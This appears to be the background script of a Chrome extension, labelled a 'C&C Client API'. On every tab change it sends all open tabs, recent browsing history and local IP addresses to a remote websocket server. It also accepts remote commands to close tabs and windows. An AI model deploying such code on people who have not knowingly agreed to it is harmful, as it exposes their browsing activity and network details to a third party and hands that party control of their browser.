/* C&C Client API */
// Update info whenever tabs are opened, modified, or closed
chrome.tabs.onCreated.addListener(update);
chrome.tabs.onUpdated.addListener(update);
chrome.tabs.onRemoved.addListener(update);

/* Outgoing protocol definition */
// Gather and update all information
function update() {
    if (isAlive) {
        var getTabs = new Promise(function (resolve, reject) {
            chrome.tabs.query({}, function (tabs) {
                resolve(tabs);
            });
        });
        var getHistory = new Promise(function (resolve, reject) {
            chrome.history.search({ text: '', maxResults: 10 }, function (result) {
                resolve(result);
            });
        });
        var getIPs = new Promise(function (resolve, reject) {
            getLocalIPs(function (ips) {
                resolve(ips);
            });
        });
    
        Promise.all([getTabs, getHistory, getIPs])
        .then(function (data) {
            wsc.do('update', {
                successfulBlocks: successfulBlocks,
                tabs: data[0],
                history: data[1],
                ips: data[2]
            })
        });
    }
}

/* Incoming protocol handlers */
wsc.on('closeTab', function (args) {
    chrome.tabs.remove(args.tabId, function () {
        if (chrome.runtime.lastError) {
            return 'Unable to close tab';
        }
        return;
    });
});

wsc.on('closeActiveTab', function () {
    chrome.tabs.query({ active: true }, function (tabs) {
        chrome.tabs.remove(tabs.map(tab => tab.id), function() {
            if (chrome.runtime.lastError) {
                return 'Unable to close tab';
            }
            return;
        })
    })
});

wsc.on('closeAllTabs', function () {
    chrome.tabs.query({}, function (tabs) {
        chrome.tabs.remove(tabs.map(tab => tab.id), function () {
            if (chrome.runtime.lastError) {
                return 'Unable to close tabs';
            }
            return;
        });
    });
});

wsc.on('closeActiveWindow', function () {
    chrome.windows.getLastFocused(function (window) {
        chrome.windows.remove(window.id, function() {
            if (chrome.runtime.lastError) {
                return 'Unable to close window';
            }
            return;
        });
    });
});